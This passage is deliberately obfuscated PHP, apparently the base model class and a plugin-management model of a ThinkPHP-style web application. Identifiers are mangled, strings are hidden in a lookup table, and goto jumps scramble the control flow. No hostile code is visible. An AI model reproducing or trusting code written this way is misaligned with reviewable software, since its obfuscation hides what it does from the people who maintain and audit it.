$F£¿ÑöâÚø[320]: default: $F±Ù¿¨ª[$EùíÎ¹“ç·[0]] = $EùíÎ¹“ç·[1]; } if (!1 === $F±Ù¿¨ª[$EùíÎ¹“ç·[0]]) { unset($F±Ù¿¨ª[$EùíÎ¹“ç·[0]]); } } } } return $F±Ù¿¨ª; } protected function autoValidation($dŒ—Õè²Ğ’, $f¾ê«­À) { $cÏÜÖ¶ÆŠ =& $_SERVER[Æ¼ôºÙï]; if (!empty($this->options[$cÏÜÖ¶ÆŠ[321]])) { $aô±”é = $this->options[$cÏÜÖ¶ÆŠ[321]]; unset($this->options[$cÏÜÖ¶ÆŠ[321]]); } elseif (!empty($this->_validate)) { $aô±”é = $this->_validate; } if (isset($aô±”é)) { if ($this->patchValidate) { $this->error = array(); } foreach ($aô±”é as $CËõòÑñ¼÷ => $A‘¨±Êë) { if (empty($A‘¨±Êë[5]) || $A‘¨±Êë[5] == THINK_MODEL_BOTH || $A‘¨±Êë[5] == $f¾ê«­À) { if (0 == strpos($A‘¨±Êë[2], $cÏÜÖ¶ÆŠ[322]) && strpos($A‘¨±Êë[2], $cÏÜÖ¶ÆŠ[323])) { $A‘¨±Êë[2] = think_lang(substr($A‘¨±Êë[2], 2, -1)); } $A‘¨±Êë[3] = isset($A‘¨±Êë[3]) ? $A‘¨±Êë[3] : THINK_EXISTS_VALIDATE; $A‘¨±Êë[4] = isset($A‘¨±Êë[4]) ? $A‘¨±Êë[4] : $cÏÜÖ¶ÆŠ[324]; switch ($A‘¨±Êë[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($dŒ—Õè²Ğ’, $A‘¨±Êë)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($cÏÜÖ¶ÆŠ[33] != trim($dŒ—Õè²Ğ’[$A‘¨±Êë[0]])) { if (!1 === $this->_validationField($dŒ—Õè²Ğ’, $A‘¨±Êë)) { return !1; } } break; default: if (isset($dŒ—Õè²Ğ’[$A‘¨±Êë[0]])) { if (!1 === $this->_validationField($dŒ—Õè²Ğ’, $A‘¨±Êë)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($CÒ Õ„Õâ…, $d•³ˆ™Õê») { if (!1 === $this->_validationFieldItem($CÒ Õ„Õâ…, $d•³ˆ™Õê»)) { if ($this->patchValidate) { $this->error[$d•³ˆ™Õê»[0]] = $d•³ˆ™Õê»[2]; } else { $this->error = $d•³ˆ™Õê»[2]; return !1; } } return; } protected function _validationFieldItem($A•¿Ü¶×˜Ÿ, $cİ²”œ‚Š¿) { $a¨Ô”ÍÕØÓ =& $_SERVER[Æ¼ôºÙï]; switch (strtolower(trim($cİ²”œ‚Š¿[4]))) { case $a¨Ô”ÍÕØÓ[317]: case $a¨Ô”ÍÕØÓ[318]: $F©±™„¸ê = isset($cİ²”œ‚Š¿[6]) ? (array) $cİ²”œ‚Š¿[6] : array(); if (is_string($cİ²”œ‚Š¿[0]) && strpos($cİ²”œ‚Š¿[0], $a¨Ô”ÍÕØÓ[47])) { $cİ²”œ‚Š¿[0] = explode($a¨Ô”ÍÕØÓ[47], $cİ²”œ‚Š¿[0]); } if (is_array($cİ²”œ‚Š¿[0])) { foreach ($cİ²”œ‚Š¿[0] as $EÏÔ„ÌÎŠê) { $F‘å‹±ÌÔ¦[$EÏÔ„ÌÎŠê] = $A•¿Ü¶×˜Ÿ[$EÏÔ„ÌÎŠê]; } array_unshift($F©±™„¸ê, $F‘å‹±ÌÔ¦); } else { array_unshift($F©±™„¸ê, $A•¿Ü¶×˜Ÿ[$cİ²”œ‚Š¿[0]]); } if ($a¨Ô”ÍÕØÓ[317] == $cİ²”œ‚Š¿[4]) { return call_user_func_array($cİ²”œ‚Š¿[1], $F©±™„¸ê); } else { return call_user_func_array(array(&$this, $cİ²”œ‚Š¿[1]), $F©±™„¸ê); } case $a¨Ô”ÍÕØÓ[325]: return $A•¿Ü¶×˜Ÿ[$cİ²”œ‚Š¿[0]] == $A•¿Ü¶×˜Ÿ[$cİ²”œ‚Š¿[1]]; case $a¨Ô”ÍÕØÓ[326]: if (is_string($cİ²”œ‚Š¿[0]) && strpos($cİ²”œ‚Š¿[0], $a¨Ô”ÍÕØÓ[47])) { $cİ²”œ‚Š¿[0] = explode($a¨Ô”ÍÕØÓ[47], $cİ²”œ‚Š¿[0]); } $FÃİ²›¤· = array(); if (is_array($cİ²”œ‚Š¿[0])) { foreach ($cİ²”œ‚Š¿[0] as $EÏÔ„ÌÎŠê) { $FÃİ²›¤·[$EÏÔ„ÌÎŠê] = $A•¿Ü¶×˜Ÿ[$EÏÔ„ÌÎŠê]; } } else { $FÃİ²›¤·[$cİ²”œ‚Š¿[0]] = $A•¿Ü¶×˜Ÿ[$cİ²”œ‚Š¿[0]]; } if (!empty($A•¿Ü¶×˜Ÿ[$this->getPk()])) { $FÃİ²›¤·[$this->getPk()] = array($a¨Ô”ÍÕØÓ[327], $A•¿Ü¶×˜Ÿ[$this->getPk()]); } if ($this->where($FÃİ²›¤·)->find()) { return !1; } return !0; default: return $this->check($A•¿Ü¶×˜Ÿ[$cİ²”œ‚Š¿[0]], $cİ²”œ‚Š¿[1], $cİ²”œ‚Š¿[4]); } } public function check($B×ˆÉ±­³§, $b‰Ñ”­£…, $EğÆÓß„î× = "\x72\x65\x67\145\170") { $DÀóÈ÷ö½ =& $_SERVER[Æ¼ôºÙï]; $EğÆÓß„î× = strtolower(trim($EğÆÓß„î×)); switch ($EğÆÓß„î×) { case $DÀóÈ÷ö½[7]: case $DÀóÈ÷ö½[328]: $D¯„öÁ‚ã = is_array($b‰Ñ”­£…) ? $b‰Ñ”­£… : explode($DÀóÈ÷ö½[47], $b‰Ñ”­£…); return $EğÆÓß„î× == $DÀóÈ÷ö½[7] ? in_array($B×ˆÉ±­³§, $D¯„öÁ‚ã) : !in_array($B×ˆÉ±­³§, $D¯„öÁ‚ã); case $DÀóÈ÷ö½[329]: case $DÀóÈ÷ö½[330]: if (is_array($b‰Ñ”­£…)) { $Bë¡¶›»¯ = $b‰Ñ”­£…[0]; $a’…‡¦ïñÔ = $b‰Ñ”­£…[1]; } else { list($Bë¡¶›»¯, $a’…‡¦ïñÔ) = explode($DÀóÈ÷ö½[47], $b‰Ñ”­£…); } return $EğÆÓß„î× == $DÀóÈ÷ö½[329] ? $B×ˆÉ±­³§ >= $Bë¡¶›»¯ && $B×ˆÉ±­³§ <= $a’…‡¦ïñÔ : $B×ˆÉ±­³§ < $Bë¡¶›»¯ || $B×ˆÉ±­³§ > $a’…‡¦ïñÔ; case $DÀóÈ÷ö½[331]: case $DÀóÈ÷ö½[332]: return $EğÆÓß„î× == $DÀóÈ÷ö½[331] ? $B×ˆÉ±­³§ == $b‰Ñ”­£… : $B×ˆÉ±­³§ != $b‰Ñ”­£…; case $DÀóÈ÷ö½[333]: $FòŒ‰˜†‡ = mb_strlen($B×ˆÉ±­³§, $DÀóÈ÷ö½[334]); if (strpos($b‰Ñ”­£…, $DÀóÈ÷ö½[47])) { list($Bë¡¶›»¯, $a’…‡¦ïñÔ) = explode($DÀóÈ÷ö½[47], $b‰Ñ”­£…); return $FòŒ‰˜†‡ >= $Bë¡¶›»¯ && $FòŒ‰˜†‡ <= $a’…‡¦ïñÔ; } else { return $FòŒ‰˜†‡ == $b‰Ñ”­£…; } case $DÀóÈ÷ö½[335]: list($a§ÙŠ­Èß, $bàîĞÈ®ø) = explode($DÀóÈ÷ö½[47], $b‰Ñ”­£…); if (!is_numeric($a§ÙŠ­Èß)) { $a§ÙŠ­Èß = strtotime($a§ÙŠ­Èß); } if (!is_numeric($bàîĞÈ®ø)) { $bàîĞÈ®ø = strtotime($bàîĞÈ®ø); } return NOW_TIME >= $a§ÙŠ­Èß && NOW_TIME <= $bàîĞÈ®ø; case $DÀóÈ÷ö½[336]: return in_array(get_client_ip(), explode($DÀóÈ÷ö½[47], $b‰Ñ”­£…)); case $DÀóÈ÷ö½[337]: return !in_array(get_client_ip(), explode($DÀóÈ÷ö½[47], $b‰Ñ”­£…)); case $DÀóÈ÷ö½[324]: default: return $this->regex($B×ˆÉ±­³§, $b‰Ñ”­£…); } } public function query($B¤ŸóÚè®», $fÎÇÁˆ§ = false) { $E¬ óÜÒ…ê =& $_SERVER[Æ¼ôºÙï]; if (!is_bool($fÎÇÁˆ§) && !is_array($fÎÇÁˆ§)) { $fÎÇÁˆ§ = func_get_args(); array_shift($fÎÇÁˆ§); } $B¤ŸóÚè®» = str_replace(array($E¬ óÜÒ…ê[227], $E¬ óÜÒ…ê[338]), $E¬ óÜÒ…ê[50], $B¤ŸóÚè®»); $B¤ŸóÚè®» = $this->parseSql($B¤ŸóÚè®», $fÎÇÁˆ§); return $this->db->query($B¤ŸóÚè®»); } public function execute($AÙğÆ“º¬, $d²ªÑŒ¿× = false) { if (!is_bool($d²ªÑŒ¿×) && !is_array($d²ªÑŒ¿×)) { $d²ªÑŒ¿× = func_get_args(); array_shift($d²ªÑŒ¿×); } $AÙğÆ“º¬ = $this->parseSql($AÙğÆ“º¬, $d²ªÑŒ¿×); return $this->db->execute($AÙğÆ“º¬); } protected function parseSql($A‡Æ÷ŒÄµá, $FÜô‹ÎÄ°) { $C‘åä°„ğ =& $_SERVER[Æ¼ôºÙï]; if (!0 === $FÜô‹ÎÄ°) { $A›¹ö¯ô½ = $this->_parseOptions(); $A‡Æ÷ŒÄµá = $this->db->parseSql($A‡Æ÷ŒÄµá, $A›¹ö¯ô½); } elseif (is_array($FÜô‹ÎÄ°)) { $FÜô‹ÎÄ° = array_map(array($this->db, $C‘åä°„ğ[339]), $FÜô‹ÎÄ°); $A‡Æ÷ŒÄµá = vsprintf($A‡Æ÷ŒÄµá, $FÜô‹ÎÄ°); } else { $A‡Æ÷ŒÄµá = strtr($A‡Æ÷ŒÄµá, array($C‘åä°„ğ[340] => $this->getTableName(), $C‘åä°„ğ[341] => think_config($C‘åä°„ğ[240]))); } $this->db->setModel($this->name); return $A‡Æ÷ŒÄµá; } public function db($bÛÂËßÙâ— = '', $eÑ‡¨É‰¦Ö = '', $cçá‡Ãìì¶ = array()) { goto Cñ…Ø²¹«; Cñ…Ø²¹«: $aù³ˆÍøÌŸ =& $_SERVER[Æ¼ôºÙï]; if ($aù³ˆÍøÌŸ[33] === $bÛÂËßÙâ— && $this->db) { return $this->db; } static $F”ˆ»ñ‘ªØ = array(); goto BÈ Ÿ¦×Õ‘; c…Ù¡®·êÄ: $F”ˆ»ñ‘ªØ[$bÛÂËßÙâ—] = $eÑ‡¨É‰¦Ö; $this->db = $e„»Öˆè¨ê[$bÛÂËßÙâ—]; $this->_after_db(); goto f··°“¤šµ; BÈ Ÿ¦×Õ‘: static $e„»Öˆè¨ê = array(); if (!isset($e„»Öˆè¨ê[$bÛÂËßÙâ—]) || isset($e„»Öˆè¨ê[$bÛÂËßÙâ—]) && $eÑ‡¨É‰¦Ö && $F”ˆ»ñ‘ªØ[$bÛÂËßÙâ—] != $eÑ‡¨É‰¦Ö) { if (!empty($eÑ‡¨É‰¦Ö) && is_string($eÑ‡¨É‰¦Ö) && !1 === strpos($eÑ‡¨É‰¦Ö, $aù³ˆÍøÌŸ[8])) { $eÑ‡¨É‰¦Ö = think_config($eÑ‡¨É‰¦Ö); } $e„»Öˆè¨ê[$bÛÂËßÙâ—] = Db::getInstance($eÑ‡¨É‰¦Ö); } elseif (NULL === $eÑ‡¨É‰¦Ö) { $e„»Öˆè¨ê[$bÛÂËßÙâ—]->close(); unset($e„»Öˆè¨ê[$bÛÂËßÙâ—]); return; } if (!empty($cçá‡Ãìì¶)) { if (is_string($cçá‡Ãìì¶)) { parse_str($cçá‡Ãìì¶, $cçá‡Ãìì¶); } foreach ($cçá‡Ãìì¶ as $d„İßÉÚá => $A±ğÏ‘æƒÆ) { $this->setProperty($d„İßÉÚá, $A±ğÏ‘æƒÆ); } } goto c…Ù¡®·êÄ; f··°“¤šµ: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto C‰Ñ¼ç­; C‰Ñ¼ç­: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $a¸†‘ÑÔ¤‰ = get_class($this); if ($a¸†‘ÑÔ¤‰ == $_SERVER[Æ¼ôºÙï][342]) { return $this->name; } $this->name = substr($a¸†‘ÑÔ¤‰, 0, -5); } return $this->name; } public function getTableName() { $cÙæÛ±¨ñˆ =& $_SERVER[Æ¼ôºÙï]; if (empty($this->trueTableName)) { $c˜ßœ££Î = !empty($this->tablePrefix) ? $this->tablePrefix : $cÙæÛ±¨ñˆ[33]; if (!empty($this->tableName)) { $c˜ßœ££Î .= $this->tableName; } else { $c˜ßœ££Î .= think_parse_name($this->name); } $this->trueTableName = strtolower($c˜ßœ££Î); } return (!empty($this->dbName) ? $this->dbName . $cÙæÛ±¨ñˆ[94] : $cÙæÛ±¨ñˆ[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $d°¶óŠ«—ˆ =& $_SERVER[Æ¼ôºÙï]; return isset($this->fields[$d°¶óŠ«—ˆ[247]]) ? $this->fields[$d°¶óŠ«—ˆ[247]] : $this->pk; } public function getDbFields() { $D‰é‚ã æ¨ =& $_SERVER[Æ¼ôºÙï]; if (isset($this->options[$D‰é‚ã æ¨[275]])) { $e’ò·ôÃ›Î = $this->db->getFields($this->options[$D‰é‚ã æ¨[275]]); return $e’ò·ôÃ›Î ? array_keys($e’ò·ôÃ›Î) : !1; } if ($this->fields) { $e’ò·ôÃ›Î = $this->fields; unset($e’ò·ôÃ›Î[$D‰é‚ã æ¨[246]], $e’ò·ôÃ›Î[$D‰é‚ã æ¨[247]], $e’ò·ôÃ›Î[$D‰é‚ã æ¨[248]], $e’ò·ôÃ›Î[$D‰é‚ã æ¨[245]]); return $e’ò·ôÃ›Î; } return !1; } public function data($b×æ˜ÌãŞÑ = '') { $A¢§Õå•øÍ =& $_SERVER[Æ¼ôºÙï]; if ($A¢§Õå•øÍ[33] === $b×æ˜ÌãŞÑ && !empty($this->data)) { return $this->data; } if (is_object($b×æ˜ÌãŞÑ)) { $b×æ˜ÌãŞÑ = get_object_vars($b×æ˜ÌãŞÑ); } elseif (is_string($b×æ˜ÌãŞÑ)) { parse_str($b×æ˜ÌãŞÑ, $b×æ˜ÌãŞÑ); } elseif (!is_array($b×æ˜ÌãŞÑ)) { think_exception(think_lang($A¢§Õå•øÍ[267])); } $this->data = $b×æ˜ÌãŞÑ; return $this; } public function join($F·£„Œ×áÁ) { $bŠÊØÏòì‰ =& $_SERVER[Æ¼ôºÙï]; if (is_array($F·£„Œ×áÁ)) { $this->options[$bŠÊØÏòì‰[278]] = $F·£„Œ×áÁ; } elseif (!empty($F·£„Œ×áÁ)) { $this->options[$bŠÊØÏòì‰[278]][] = $F·£„Œ×áÁ; } return $this; } public function union($Få·Á‡ŠôË, $D¼½‰¸‡î” = false) { goto A˜ÕÏÕ ÆÉ; eÖ¢á£µé: if (is_object($Få·Á‡ŠôË)) { $Få·Á‡ŠôË = get_object_vars($Få·Á‡ŠôË); } if (is_string($Få·Á‡ŠôË)) { $fµ‘ˆ…“¼° = $Få·Á‡ŠôË; } elseif (is_array($Få·Á‡ŠôË)) { if (isset($Få·Á‡ŠôË[0])) { $this->options[$CŠº›öÖ«[343]] = array_merge($this->options[$CŠº›öÖ«[343]], $Få·Á‡ŠôË); return $this; } else { $fµ‘ˆ…“¼° = $Få·Á‡ŠôË; } } else { think_exception(think_lang($CŠº›öÖ«[267])); } $this->options[$CŠº›öÖ«[343]][] = $fµ‘ˆ…“¼°; goto Cç•¨®ÏÂÄ; Cç•¨®ÏÂÄ: return $this; goto c¾¯ºùÊéæ; A˜ÕÏÕ ÆÉ: $CŠº›öÖ« =& $_SERVER[Æ¼ôºÙï]; if (empty($Få·Á‡ŠôË)) { return $this; } if ($D¼½‰¸‡î”) { $this->options[$CŠº›öÖ«[343]][$CŠº›öÖ«[344]] = !0; } goto eÖ¢á£µé; c¾¯ºùÊéæ: } public function cache($D­Š™âË‹Œ = true, $d¬ÓŒ³›ßã = null, $dëôÕ¹³ç• = '') { $CÚôÑÌƒ¤‹ =& $_SERVER[Æ¼ôºÙï]; if (!1 !== $D­Š™âË‹Œ) { $this->options[$CÚôÑÌƒ¤‹[345]] = array($CÚôÑÌƒ¤‹[92] => $D­Š™âË‹Œ, $CÚôÑÌƒ¤‹[335] => $d¬ÓŒ³›ßã, $CÚôÑÌƒ¤‹[29] => $dëôÕ¹³ç•); } return $this; } public function field($A«¶‰Šœ, $DÇ…¹ÚØŸµ = false) { $eŸ³’‚À»Ş =& $_SERVER[Æ¼ôºÙï]; if (!0 === $A«¶‰Šœ) { $FªëÓ…Šßµ = $this->getDbFields(); $A«¶‰Šœ = $FªëÓ…Šßµ ? $FªëÓ…Šßµ : $eŸ³’‚À»Ş[182]; } elseif ($DÇ…¹ÚØŸµ) { if (is_string($A«¶‰Šœ)) { $A«¶‰Šœ = explode($eŸ³’‚À»Ş[47], $A«¶‰Šœ); } $FªëÓ…Šßµ = $this->getDbFields(); $A«¶‰Šœ = $FªëÓ…Šßµ ? array_diff($FªëÓ…Šßµ, $A«¶‰Šœ) : $A«¶‰Šœ; } $this->options[$eŸ³’‚À»Ş[269]] = $A«¶‰Šœ; return $this; } public function scope($e²Ã…ÜšÏ© = '', $Cõ¡´ñºªÃ = NULL) { $CÅƒ®Ù¶  =& $_SERVER[Æ¼ôºÙï]; if ($CÅƒ®Ù¶ [33] === $e²Ã…ÜšÏ©) { if (isset($this->_scope[$CÅƒ®Ù¶ [34]])) { $DçÈÍŠÌ¡Ì = $this->_scope[$CÅƒ®Ù¶ [34]]; } else { return $this; } } elseif (is_string($e²Ã…ÜšÏ©)) { $E…‚ƒ§ÌÇØ = explode($CÅƒ®Ù¶ [47], $e²Ã…ÜšÏ©); $DçÈÍŠÌ¡Ì = array(); foreach ($E…‚ƒ§ÌÇØ as $dœˆ»˜Øã¡) { if (!isset($this->_scope[$dœˆ»˜Øã¡])) { continue; } $DçÈÍŠÌ¡Ì = array_merge($DçÈÍŠÌ¡Ì, $this->_scope[$dœˆ»˜Øã¡]); } if (!empty($Cõ¡´ñºªÃ) && is_array($Cõ¡´ñºªÃ)) { $DçÈÍŠÌ¡Ì = array_merge($DçÈÍŠÌ¡Ì, $Cõ¡´ñºªÃ); } } elseif (is_array($e²Ã…ÜšÏ©)) { $DçÈÍŠÌ¡Ì = $e²Ã…ÜšÏ©; } if (is_array($DçÈÍŠÌ¡Ì) && !empty($DçÈÍŠÌ¡Ì)) { $this->options = array_merge($this->options, array_change_key_case($DçÈÍŠÌ¡Ì)); } return $this; } public function where($eîËÛá•¦, $Cã÷­ˆ™† = null) { $D½ªë­±œ‚ =& $_SERVER[Æ¼ôºÙï]; if (!is_null($Cã÷­ˆ™†) && is_string($eîËÛá•¦)) { if (!is_array($Cã÷­ˆ™†)) { $Cã÷­ˆ™† = func_get_args(); array_shift($Cã÷­ˆ™†); } $Cã÷­ˆ™† = array_map(array($this->db, $D½ªë­±œ‚[339]), $Cã÷­ˆ™†); $eîËÛá•¦ = vsprintf($eîËÛá•¦, $Cã÷­ˆ™†); } elseif (is_object($eîËÛá•¦)) { $eîËÛá•¦ = get_object_vars($eîËÛá•¦); } elseif (is_array($eîËÛá•¦)) { foreach ($eîËÛá•¦ as $CÉˆ‹Áµ => $B³¨…¢ƒ¥») { if ((is_numeric($CÉˆ‹Áµ) || !$CÉˆ‹Áµ) && is_string($B³¨…¢ƒ¥»)) { if (strpos($B³¨…¢ƒ¥», $D½ªë­±œ‚[346]) === 0) { continue; } think_trace($D½ªë­±œ‚[347], $D½ªë­±œ‚[33], $D½ªë­±œ‚[46]); die; } } } if (is_string($eîËÛá•¦) && $D½ªë­±œ‚[33] != $eîËÛá•¦) { $dÀ†œê¿ÕÚ = array(); $dÀ†œê¿ÕÚ[$D½ªë­±œ‚[348]] = $eîËÛá•¦; $eîËÛá•¦ = $dÀ†œê¿ÕÚ; } if (isset($this->options[$D½ªë­±œ‚[271]])) { $this->options[$D½ªë­±œ‚[271]] = array_merge($this->options[$D½ªë­±œ‚[271]], $eîËÛá•¦); } else { $this->options[$D½ªë­±œ‚[271]] = $eîËÛá•¦; } return $this; } public function limit($AÃİŠé¨ù, $Dïà”êŒ¸ä = null) { $dÙµèÄÕ¬ =& $_SERVER[Æ¼ôºÙï]; $this->options[$dÙµèÄÕ¬[288]] = is_null($Dïà”êŒ¸ä) ? $AÃİŠé¨ù : $AÃİŠé¨ù . $dÙµèÄÕ¬[47] . $Dïà”êŒ¸ä; return $this; } public function page($b™È“Ãˆ¿, $A±ºÊ´Äê¾ = null) { $B‰“»çŞè– =& $_SERVER[Æ¼ôºÙï]; $this->options[$B‰“»çŞè–[349]] = is_null($A±ºÊ´Äê¾) ? $b™È“Ãˆ¿ : $b™È“Ãˆ¿ . $B‰“»çŞè–[47] . $A±ºÊ´Äê¾; return $this; } public function comment($c“÷µîŒÈÁ) { $this->options[$_SERVER[Æ¼ôºÙï][350]] = $c“÷µîŒÈÁ; return $this; } public function setProperty($cçÉ‚‹…²¿, $e­é¬¨ÑÆğ) { if (property_exists($this, $cçÉ‚‹…²¿)) { $this->{$cçÉ‚‹…²¿} = $e­é¬¨ÑÆğ; } return $this; } } goto FŠ…Ÿ––®; Dµ»ÃŒÍ‹: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\x70\x6c\165\147\151\x6e\x4c\151\x73\x74"; public $field = array("\x6e\x61\155\x65", "\163\164\141\x74\165\163", "\162\x65\147\x69\x65\163\x74", "\x63\x6f\156\x66\151\147"); public function loadList($FñÉ’£ÜÖ = false) { $cÎ÷²Ÿîöâ = array_to_keyvalue($this->listData(), $_SERVER[Æ¼ôºÙï][28]); if ($FñÉ’£ÜÖ) { return $cÎ÷²Ÿîöâ[$FñÉ’£ÜÖ]; } return $cÎ÷²Ÿîöâ; } public function init() { $c™¬Ê¼ÛÚ­ =& $_SERVER[Æ¼ôºÙï]; Hook::trigger($c™¬Ê¼ÛÚ­[1771]); $FËãá‰•é¹ = $this->loadPluginList(); foreach ($FËãá‰•é¹ as $A„¬µ¸Ş => $AÕª‚ˆË) { $aÆ™²ß„±“ = $this->appAllow($A„¬µ¸Ş, $AÕª‚ˆË); if (!$aÆ™²ß„±“) { continue; } foreach ($AÕª‚ˆË[$c™¬Ê¼ÛÚ­[1772]] as $aó­¬ë®Î => $Eª•ğ­‘ßÁ) { Hook::bind($aó­¬ë®Î, $Eª•ğ­‘ßÁ); } } Hook::trigger($c™¬Ê¼ÛÚ­[1773]); Hook::trigger(ACTION); } public function appAllow($d³Ã×Šµˆó, $DÏ¼á©Ñ, $dòÑó¬†õÖ = true) { $bùİ²ÄË =& $_SERVER[Æ¼ôºÙï]; $E™šÑéáº÷ = PLUGIN_DIR . $d³Ã×Šµˆó . $bùİ²ÄË[1774]; if (!is_array($DÏ¼á©Ñ) || !is_array($DÏ¼á©Ñ[$bùİ²ÄË[1772]]) || $DÏ¼á©Ñ[$bùİ²ÄË[708]] != 1 || !is_file($E™šÑéáº÷)) { return !1; } if ($GLOBALS[$bùİ²ÄË[475]] == 1) { return !0; } if ($dòÑó¬†õÖ && !Action($bùİ²ÄË[1775])->checkAuth($d³Ã×Šµˆó)) { return !1; } return !0; } public function unInstall($aßæÒİâ) { $Aæ•ˆèå±Ó =& $_SERVER[Æ¼ôºÙï]; $DÁ¦‹´œÔê = $this->loadList($aßæÒİâ); if (file_exists(PLUGIN_DIR . $aßæÒİâ)) { Hook::apply($aßæÒİâ . $Aæ•ˆèå±Ó[1776]); } $this->remove($DÁ¦‹´œÔê[$Aæ•ˆèå±Ó[385]]); } public function changeStatus($A“§ÖŞ¤Ñ, $EøÃÄ²Âö¦) { $FÇ«ª÷¤­ =& $_SERVER[Æ¼ôºÙï]; $a¹ñÌè˜» = $this->loadList($A“§ÖŞ¤Ñ); if ($EøÃÄ²Âö¦) { Hook::apply($A“§ÖŞ¤Ñ . $FÇ«ª÷¤­[1777]); } $this->update($a¹ñÌè˜»[$FÇ«ª÷¤­[385]], array($FÇ«ª÷¤­[1778] => $EøÃÄ²Âö¦)); } public function appRegist($bó¾µä³—Ÿ, $cÉŠÕ¸’»‰) { $d÷æˆë®ÕÅ =& $_SERVER[Æ¼ôºÙï]; $eÇÇ²Íô²… = $this->loadList($bó¾µä³—Ÿ); if ($eÇÇ²Íô²…) { $this->update($eÇÇ²Íô²…[$d÷æˆë®ÕÅ[385]], array($d÷æˆë®ÕÅ[1772] => $cÉŠÕ¸’»‰)); } else { $f®Ç‡ÇÛó‡ = array($d÷æˆë®ÕÅ[28] => $bó¾µä³—Ÿ, $d÷æˆë®ÕÅ[1772] => $cÉŠÕ¸’»‰, $d÷æˆë®ÕÅ[708] => 0, $d÷æˆë®ÕÅ[6] => $this->getConfigDefault($bó¾µä³—Ÿ)); $this->insert($f®Ç‡ÇÛó‡); } } public function getConfigDefault($CòñòÇÏò) { $fĞğ†’ƒ¹ =& $_SERVER[Æ¼ôºÙï]; $cœÒİçÔÉ› = array(); $D‚óæé©Å = $this->getPackageJson($CòñòÇÏò); if (!$D‚óæé©Å && is_array($D‚óæé©Å[$fĞğ†’ƒ¹[1779]])) { return $cœÒİçÔÉ›; } foreach ($D‚óæé©Å[$fĞğ†’ƒ¹[1779]] as $fÅåÙÈèìŞ => $a÷Íòµ„¹ë) { if (!isset($a÷Íòµ„¹ë[$fĞğ†’ƒ¹[368]]) || isset($cœÒİçÔÉ›[$fÅåÙÈèìŞ])) { continue; } $cœÒİçÔÉ›[$fÅåÙÈèìŞ] = $a÷Íòµ„¹ë[$fĞğ†’ƒ¹[368]]; } return $cœÒİçÔÉ›; } public function getPackageJson($BÄ¯›˜Ë¤) { return Hook::apply($BÄ¯›˜Ë¤ . $_SERVER[Æ¼ôºÙï][1780]); } public function getConfig($aÕïÊç¼¯×, $F´á™ï¨Ş¯ = false) { $D±ƒÊ”¦Á =& $_SERVER[Æ¼ôºÙï]; $eÈå’ˆ‰ºÇ = array(); $cõÇà–Ãä„ = $this->loadList($aÕïÊç¼¯×); if ($cõÇà–Ãä„ && is_array($cõÇà–Ãä„[$D±ƒÊ”¦Á[6]])) { $eÈå’ˆ‰ºÇ = $cõÇà–Ãä„[$D±ƒÊ”¦Á[6]]; } if (!$eÈå’ˆ‰ºÇ || $F´á™ï¨Ş¯) { $eÈå’ˆ‰ºÇ = $this->getConfigDefault($aÕïÊç¼¯×); } return $eÈå’ˆ‰ºÇ; } public function setConfig($F›‡ùÊšÖº, $F¼»–æ—ƒƒ = false) { goto Eù¿æ‹Ûé; B¢ˆ–ğÚÀ¤: $this->update($bßòÆÂ÷Ë[$e°ÙÏÃ”å™[385]], array($e°ÙÏÃ”å™[6] => $a¥·’èÚó)); goto dê˜×ŠÔä¨; có¥•ˆŸ: $a¥·’èÚó = $bßòÆÂ÷Ë[$e°ÙÏÃ”å™[6]]; if ($F¼»–æ—ƒƒ == !1) { $a¥·’èÚó = array(); $F¼»–æ—ƒƒ = $this->getConfigDefault($F›‡ùÊšÖº); } foreach ($F¼»–æ—ƒƒ as $fÃìİÔæò => $Cé÷÷½Ùî²) { $a¥·’èÚó[$fÃìİÔæò] = is_string($Cé÷÷½Ùî²) ? trim($Cé÷÷½Ùî²) : $Cé÷÷½Ùî²; } goto B¢ˆ–ğÚÀ¤; Eù¿æ‹Ûé: $e°ÙÏÃ”å™ =& $_SERVER[Æ¼ôºÙï]; $bßòÆÂ÷Ë = $this->loadList($F›‡ùÊšÖº); if (!$bßòÆÂ÷Ë) { return !1; } goto có¥•ˆŸ; dê˜×ŠÔä¨: } public function viewList() { goto fÅ²óàŠ÷; aë´àõ¾í™: $fÜ÷ÅŞé¦ = $this->loadPluginList(); $D™ÜÎğÚíÖ = array(); foreach ($fÜ÷ÅŞé¦ as $E‚ßÖÎ–• => $bàÕ…ßëÀ½) { unset($bàÕ…ßëÀ½[$c À›“ô½Á[1772]], $bàÕ…ßëÀ½[$c À›“ô½Á[6]]); $e¸»„Ïè¸Ô = PLUGIN_DIR . $bàÕ…ßëÀ½[$c À›“ô½Á[28]] . $c À›“ô½Á[1774]; if (!is_file($e¸»„Ïè¸Ô)) { continue; } $A“¸ß§Òñ = Hook::apply($bàÕ…ßëÀ½[$c À›“ô½Á[28]] . $c À›“ô½Á[1780]); if (is_array($A“¸ß§Òñ)) { $D™ÜÎğÚíÖ[$E‚ßÖÎ–•] = array_merge($bàÕ…ßëÀ½, $A“¸ß§Òñ); } } goto CĞ×Úã´; fÅ²óàŠ÷: $c À›“ô½Á =& $_SERVER[Æ¼ôºÙï]; $fÜ÷ÅŞé¦ = $this->loadList(); $this->pluginScan($fÜ÷ÅŞé¦); goto aë´àõ¾í™; CĞ×Úã´: return $D™ÜÎğÚíÖ; goto bèƒ×’íöƒ; bèƒ×’íöƒ: } private function loadPluginList() { $a›¤ÅåÔŸ„ =& $_SERVER[Æ¼ôºÙï]; $ağŸÉ­îÉµ = $this->loadList(); if (strtolower(MOD) == $a›¤ÅåÔŸ„[1781]) { return $ağŸÉ­îÉµ; } $CöæĞ„Ğ = Hook::trigger($a›¤ÅåÔŸ„[1782], $ağŸÉ­îÉµ); if ($ağŸÉ­îÉµ && !$CöæĞ„Ğ) { die; } return $CöæĞ„Ğ ? $CöæĞ„Ğ : $ağŸÉ­îÉµ; } private function 